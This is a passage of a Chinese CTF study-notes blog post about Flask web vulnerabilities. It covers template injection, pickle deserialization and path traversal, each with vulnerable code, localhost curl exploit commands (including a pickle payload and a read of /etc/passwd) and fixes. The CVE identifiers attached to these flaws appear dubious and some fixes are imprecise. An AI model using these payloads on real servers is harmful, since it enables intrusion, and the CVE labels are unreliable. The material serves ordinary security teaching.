<h2 id="CVE-2019-1010084-Flask-远程代码执行漏洞-RCE"><a href="#CVE-2019-1010084-Flask-远程代码执行漏洞-RCE" class="headerlink" title="CVE-2019-1010084 - Flask 远程代码执行漏洞 (RCE)"></a>CVE-2019-1010084 - Flask 远程代码执行漏洞 (RCE)</h2><h3 id="漏洞描述-1"><a href="#漏洞描述-1" class="headerlink" title="漏洞描述"></a>漏洞描述</h3><p><strong>CVE-2019-1010084</strong> 是 Flask 中的远程代码执行漏洞。此漏洞与 Flask 中不安全地使用 <code>render_template_string()</code> 函数有关。<code>render_template_string()</code> 用于动态渲染模板，但如果未对用户输入进行过滤或验证，攻击者可以通过构造恶意模板代码，实现任意代码执行。</p>
<h3 id="漏洞利用-1"><a href="#漏洞利用-1" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>攻击者可以向应用程序传递恶意的 Jinja2 模板表达式，利用 Flask 的模板引擎执行任意代码。</p>
<h4 id="示例代码：-1"><a href="#示例代码：-1" class="headerlink" title="示例代码："></a>示例代码：</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask, request, render_template_string<br><br>app = Flask(__name__)<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/template&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">template</span>():<br>    user_input = request.args.get(<span class="hljs-string">&#x27;template&#x27;</span>)<br>    <span class="hljs-keyword">return</span> render_template_string(user_input)<br></code></pre></td></tr></table></figure>

<h4 id="利用方法：-1"><a href="#利用方法：-1" class="headerlink" title="利用方法："></a>利用方法：</h4><p>攻击者可以构造恶意的模板表达式进行攻击。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">curl <span class="hljs-string">&quot;http://localhost:5000/template?template=&#123;&#123;7*7&#125;&#125;&quot;</span><br></code></pre></td></tr></table></figure>

<p>这会返回 <code>49</code>，说明模板表达式已经被成功执行。</p>
<h4 id="更严重的攻击："><a href="#更严重的攻击：" class="headerlink" title="更严重的攻击："></a>更严重的攻击：</h4><p>攻击者可以利用模板注入执行任意 Python 代码。例如：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">curl <span class="hljs-string">&quot;http://localhost:5000/template?template=&#123;&#123;config.items()&#125;&#125;&quot;</span><br></code></pre></td></tr></table></figure>

<p><strong>解释</strong>：</p>
<ol>
<li><code>render_template_string()</code> 不安全地直接渲染了用户提供的字符串。</li>
<li>攻击者可以构造恶意的模板代码，借助 Jinja2 的模板表达式执行 Python 代码。</li>
</ol>
<p><strong>解决方法</strong>：</p>
<ol>
<li>避免直接使用 <code>render_template_string</code> 渲染用户输入的数据。</li>
<li>如果必须使用动态渲染，使用严格的过滤或使用 <code>StrictUndefined</code> 模式：</li>
</ol>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> jinja2 <span class="hljs-keyword">import</span> Environment, StrictUndefined<br><br>env = Environment(undefined=StrictUndefined)<br></code></pre></td></tr></table></figure>

<hr>
<h2 id="CVE-2018-1000656-Flask-反序列化漏洞"><a href="#CVE-2018-1000656-Flask-反序列化漏洞" class="headerlink" title="CVE-2018-1000656 - Flask 反序列化漏洞"></a>CVE-2018-1000656 - Flask 反序列化漏洞</h2><h3 id="漏洞描述-2"><a href="#漏洞描述-2" class="headerlink" title="漏洞描述"></a>漏洞描述</h3><p><strong>CVE-2018-1000656</strong> 是 Flask 应用中的反序列化漏洞。反序列化漏洞通常发生在不安全地反序列化用户输入的数据时，攻击者可以通过构造恶意的序列化数据来执行任意代码。</p>
<h3 id="漏洞利用-2"><a href="#漏洞利用-2" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>Flask 应用通过 <code>pickle</code> 或类似的反序列化机制加载用户输入的数据时，攻击者可以构造恶意序列化数据，使得应用执行任意代码。</p>
<h4 id="示例代码：-2"><a href="#示例代码：-2" class="headerlink" title="示例代码："></a>示例代码：</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> pickle<br><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask, request<br><br>app = Flask(__name__)<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/load_data&#x27;</span>, methods=[<span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">load_data</span>():<br>    serialized_data = request.data<br>    data = pickle.loads(serialized_data)<br>    <span class="hljs-keyword">return</span> data<br></code></pre></td></tr></table></figure>

<h4 id="利用方法：-2"><a href="#利用方法：-2" class="headerlink" title="利用方法："></a>利用方法：</h4><p>攻击者可以构造恶意的序列化数据，发送到服务器端，导致远程代码执行。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> pickle<br><span class="hljs-keyword">import</span> os<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">RCE</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__reduce__</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-keyword">return</span> (os.system, (<span class="hljs-string">&#x27;ls&#x27;</span>,))<br><br>payload = pickle.dumps(RCE())<br><span class="hljs-built_in">print</span>(payload)<br></code></pre></td></tr></table></figure>

<p>通过 POST 请求发送恶意数据：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">curl -X POST --data-binary <span class="hljs-string">&quot;@payload.pickle&quot;</span> http://localhost:5000/load_data<br></code></pre></td></tr></table></figure>

<p><strong>解释</strong>：</p>
<ol>
<li><code>pickle.loads</code> 直接反序列化用户提供的数据，攻击者可以构造恶意序列化对象。</li>
<li><code>__reduce__</code> 方法被用来指定如何反序列化对象，从而执行恶意代码（如 <code>os.system(&#39;ls&#39;)</code>）。</li>
</ol>
<p><strong>解决方法</strong>：</p>
<ol>
<li>避免使用 <code>pickle</code> 反序列化不受信任的用户数据。</li>
<li>如果需要序列化数据，建议使用安全的序列化格式，如 <code>JSON</code>。</li>
</ol>
<hr>
<h2 id="CVE-2019-1010085-Flask-文件上传路径遍历漏洞"><a href="#CVE-2019-1010085-Flask-文件上传路径遍历漏洞" class="headerlink" title="CVE-2019-1010085 - Flask 文件上传路径遍历漏洞"></a>CVE-2019-1010085 - Flask 文件上传路径遍历漏洞</h2><h3 id="漏洞描述-3"><a href="#漏洞描述-3" class="headerlink" title="漏洞描述"></a>漏洞描述</h3><p><strong>CVE-2019-1010085</strong> 是 Flask 文件上传功能中的路径遍历漏洞。攻击者通过构造恶意文件名，可以访问服务器上的敏感文件，甚至执行文件覆盖等攻击。</p>
<h3 id="漏洞利用-3"><a href="#漏洞利用-3" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>攻击者可以通过上传文件时构造恶意路径，利用路径遍历漏洞访问服务器上的任意文件，甚至可能覆盖关键文件。</p>
<h4 id="示例代码：-3"><a href="#示例代码：-3" class="headerlink" title="示例代码："></a>示例代码：</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask, request, send_from_directory<br><br>app = Flask(__name__)<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/file/&lt;path:filename&gt;&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">download_file</span>(<span class="hljs-params">filename</span>):<br>    <span class="hljs-keyword">return</span> send_from_directory(<span class="hljs-string">&#x27;/uploads&#x27;</span>, filename)<br></code></pre></td></tr></table></figure>

<h4 id="利用方法：-3"><a href="#利用方法：-3" class="headerlink" title="利用方法："></a>利用方法：</h4><p>攻击者可以通过文件名参数构造路径遍历攻击。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">curl <span class="hljs-string">&quot;http://localhost:5000/file/../../etc/passwd&quot;</span><br></code></pre></td></tr></table></figure>

<p>此攻击将读取服务器上的 <code>/etc/passwd</code> 文件内容。</p>
<p><strong>解释</strong>：</p>
<ol>
<li><code>send_from_directory(&#39;/uploads&#39;, filename)</code> 函数中没有验证 <code>filename</code> 参数，攻击者可以构造路径遍历（如 <code>../../</code>）来读取任意文件。</li>
<li>通过 <code>..</code> 来跳出 <code>/uploads</code> 目录，访问系统文件。</li>
</ol>
<p><strong>解决方法</strong>：<br>使用 <code>os.path.join</code> 或 <code>safe_join</code> 来确保文件路径在指定目录内：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> werkzeug.utils <span class="hljs-keyword">import</span> secure_filename, safe_join<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/file/&lt;path:filename&gt;&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">download_file</span>(<span class="hljs-params">filename</span>):<br>    safe_filename = secure_filename(filename)<br>    safe_path = safe_join(<span class="hljs-string">&#x27;/uploads&#x27;</span>, safe_filename)<br>    <span class="hljs-keyword">return</span> send_from_directory(<span class="hljs-string">&#x27;/uploads&#x27;</span>, safe_path)<br></code></pre></td></tr></table></figure>

<ul>
<li><code>secure_filename</code> 将文件名安全化，移除特殊字符和危险路径。</li>
<li><code>safe_join</code> 确保路径在 <code>/uploads</code> 目录下，防止路径遍历攻击。</li>
</ul>
<hr>
<h3 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h3><ol>
<li><p><strong>SQL 注入</strong>：Flask 中的 SQL 注入攻击通常发生在未使用参数化查询的地方。攻击者可以通过注入恶意的 SQL 语句，查询、修改甚至删除数据库中的数据。防御措施是使用 ORM 工具，如 SQLAlchemy，避免直接拼接 SQL 字符串。</p>
</li>
<li><p>**远程代码执行 (RCE)**：Flask 使用 <code>render_template_string</code> 时，容易受到模板注入攻击。攻击者通过注入恶意模板表达式可以执行任意代码。防御措施是避免渲染用户输入的模板，使用严格的模板渲染模式。</p>
</li>
<li><p><strong>反序列化漏洞</strong>：当 Flask 使用 <code>pickle</code> 等反序列化库时，容易受到反序列化攻击。攻击者可以构造恶意序列化数据，导致任意代码执行。防御措施是避免使用不安全的序列化方法，推荐使用 JSON 作为序列化方式。</p>
</li>
<li><p><strong>路径遍历漏洞</strong>：Flask 中的路径遍历攻击发生在处理文件路径时，攻击者可以通过构造恶意的文件路径访问服务器上的任意文件。防御措施是确保文件</p>
</li>
</ol>
<p>路径的合法性，使用 <code>secure_filename</code> 和 <code>safe_join</code> 函数来防止路径遍历。</p>

                
              </div>
            
            <hr/>
            <div>
              <div class="post-metas my-3">
  
    <div class="post-meta mr-3 d-flex align-items-center">
      <i class="iconfont icon-category"></i>
      

<span class="category-chains">
  
  
    
      <span class="category-chain">
        
  <a href="/categories/ctfweb%E5%9F%BA%E7%A1%80%E7%AC%94%E8%AE%B0/" class="category-chain-item">ctfweb基础笔记</a>
  
  

      </span>
    
  
</span>

    </div>
  
  
    <div class="post-meta">
      <i class="iconfont icon-tags"></i>
      
        <a href="/tags/ctfweb/" class="print-no-link">#ctfweb</a>
      
    </div>
  
</div>


              
  

  <div class="license-box my-3">
    <div class="license-title">
      <div>ctf基础笔记</div>
      <div>https://theganlove.github.io/2024/09/05/ctf基础笔记/</div>
    </div>
    <div class="license-meta">
      
        <div class="license-meta-item">
          <div>作者</div>
          <div>uert</div>
        </div>
      
      
        <div class="license-meta-item license-meta-date">
          <div>发布于</div>
          <div>2024年9月5日</div>
        </div>
      
      
      
        <div class="license-meta-item">
          <div>许可协议</div>
          <div>
            
              
              
                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
                    <i class="iconfont icon-cc-by"></i>
                  </span>
                </a>
              
            
          </div>
        </div>
      
    </div>
    <div class="license-icon iconfont"></div>
  </div>



              
                <div class="post-prevnext my-3">
                  <article class="post-prev col-6">
                    
                    
                      <a href="/2024/09/07/%E6%95%B0%E5%80%BC%E5%88%86%E6%9E%90/" title="">
                        <i class="iconfont icon-arrowleft"></i>
                        <span class="hidden-mobile"></span>
                        <span class="visible-mobile">上一篇</span>
                      </a>
                    
                  </article>
                  <article class="post-next col-6">
                    
                    
                      <a href="/2024/09/03/c%E8%AF%AD%E8%A8%80%E7%9A%84%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/" title="c语言的数据结构">
                        <span class="hidden-mobile">c语言的数据结构</span>
                        <span class="visible-mobile">下一篇</span>
                        <i class="iconfont icon-arrowright"></i>
                      </a>
                    
                  </article>
                </div>
              
            </div>

            
          </article>
        </div>
      </div>
    </div>

    <div class="side-col d-none d-lg-block col-lg-2">
      
  <aside class="sidebar" style="margin-left: -1rem">
    <div id="toc">
  <p class="toc-header">
    <i class="iconfont icon-list"></i>
    <span>目录</span>
  </p>
  <div class="toc-body" id="toc-body"></div>
</div>



  </aside>


    </div>
  </div>
</div>





  



  



  



  



  







    

    
      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
      </a>
    

    
      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
     aria-hidden="true">
  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
    <div class="modal-content">
      <div class="modal-header text-center">
        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body mx-3">
        <div class="md-form mb-5">
          <input type="text" id="local-search-input" class="form-control validate">
          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
        </div>
        <div class="list-group" id="local-search-result"></div>
      </div>
    </div>
  </div>
</div>

    

    
  </main>

  <footer>
    <div class="footer-inner">
  
    <div class="footer-content">
       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
    </div>
  
  
  
</div>

  </footer>

  <!-- Scripts -->
  
  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />

  <script>
    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
    NProgress.start()
    window.addEventListener('load', function() {
      NProgress.done();
    })
  </script>


<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
<script  src="/js/events.js" ></script>
<script  src="/js/plugins.js" ></script>


  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
  <script>
    (function (window, document) {
      var typing = Fluid.plugins.typing;
      var subtitle = document.getElementById('subtitle');
      if (!subtitle || !typing) {
        return;
      }
      var text = subtitle.getAttribute('data-typed-text');
      
        typing(text);
      
    })(window, document);
  </script>




  
    <script  src="/js/img-lazyload.js" ></script>
  




  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
    var toc = jQuery('#toc');
    if (toc.length === 0 || !window.tocbot) { return; }
    var boardCtn = jQuery('#board-ctn');
    var boardTop = boardCtn.offset().top;

    window.tocbot.init(Object.assign({
      tocSelector     : '#toc-body',
      contentSelector : '.markdown-body',
      linkClass       : 'tocbot-link',
      activeLinkClass : 'tocbot-active-link',
      listClass       : 'tocbot-list',
      isCollapsedClass: 'tocbot-is-collapsed',
      collapsibleClass: 'tocbot-is-collapsible',
      scrollSmooth    : true,
      includeTitleTags: true,
      headingsOffset  : -boardTop,
    }, CONFIG.toc));
    if (toc.find('.toc-list-item').length > 0) {
      toc.css('visibility', 'visible');
    }

    Fluid.events.registerRefreshCallback(function() {
      if ('tocbot' in window) {
        tocbot.refresh();
        var toc = jQuery('#toc');
        if (toc.length === 0 || !tocbot) {
          return;
        }
        if (toc.find('.toc-list-item').length > 0) {
          toc.css('visibility', 'visible');
        }
      }
    });
  });
</script>


  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>

  <script>Fluid.plugins.codeWidget();</script>


  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
    window.anchors.options = {
      placement: CONFIG.anchorjs.placement,
      visible  : CONFIG.anchorjs.visible
    };
    if (CONFIG.anchorjs.icon) {
      window.anchors.options.icon = CONFIG.anchorjs.icon;
    }
    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
    var res = [];
    for (var item of el) {
      res.push('.markdown-body > ' + item.trim());
    }
    if (CONFIG.anchorjs.placement === 'left') {
      window.anchors.options.class = 'anchorjs-link-left';
    }
    window.anchors.add(res.join(', '));

    Fluid.events.registerRefreshCallback(function() {
      if ('anchors' in window) {
        anchors.removeAll();
        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
        var res = [];
        for (var item of el) {
          res.push('.markdown-body > ' + item.trim());
        }
        if (CONFIG.anchorjs.placement === 'left') {
          anchors.options.class = 'anchorjs-link-left';
        }
        anchors.add(res.join(', '));
      }
    });
  });
</script>


  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
    Fluid.plugins.fancyBox();
  });
</script>


  <script>Fluid.plugins.imageCaption();</script>

  <script  src="/js/local-search.js" ></script>





<!-- 主题的启动项，将它保持在最底部 -->
<!-- the boot of the theme, keep it at the bottom -->
<script  src="/js/boot.js" ></script>


  

  <noscript>
    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
  </noscript>
</body>
</html>
